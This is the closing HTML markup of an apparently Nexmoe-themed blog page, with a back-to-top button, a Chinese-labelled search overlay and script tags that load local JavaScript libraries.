                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
                  </div>
              </div>
            </div>
        </div>
    </div>
    <div id="nexmoe-search-space">
	<div class="search-container">
		<div class="search-header">
			<div class="search-input-container">
				<input
					class="search-input"
					type="text"
					placeholder="搜索"
					oninput="sinput();"
				/>
			</div>
			<a class="search-close" onclick="sclose();">×</a>
		</div>
		<div class="search-body"></div>
	</div>
</div>

    
<script src="/lib/mdui_043tiny/mdui.js"></script>
<script src="/lib/fancybox/fancybox.umd.js"></script>


 

<script async src="/js/app.js?v=1665474214477"></script>



</body>

</html>
